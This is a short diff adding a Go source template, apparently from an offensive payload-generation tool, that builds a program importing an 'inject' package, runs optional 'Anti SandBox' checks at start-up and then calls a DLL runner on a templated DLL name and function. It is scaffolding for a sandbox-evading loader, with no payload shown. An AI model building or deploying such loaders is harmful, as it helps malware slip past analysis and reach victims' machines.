@@ -1,0 +1,22 @@
+package main
+
+import (
+    "variant/inject"
+
+	{{if .Args}}
+    	 "{{.Args.Import}}"
+    {{end}}
+)
+
+func init() {
+    {{/* Anti SandBox */}}
+    {{if .SandBox}}
+        {{range .SandBox.Methods}}
+            {{.}}()
+	    {{- end -}}
+	{{- end}}
+}
+
+func main(){
+    {{.DllRunner}}("{{.DllName}}", "{{.DllFunc}}")
+}
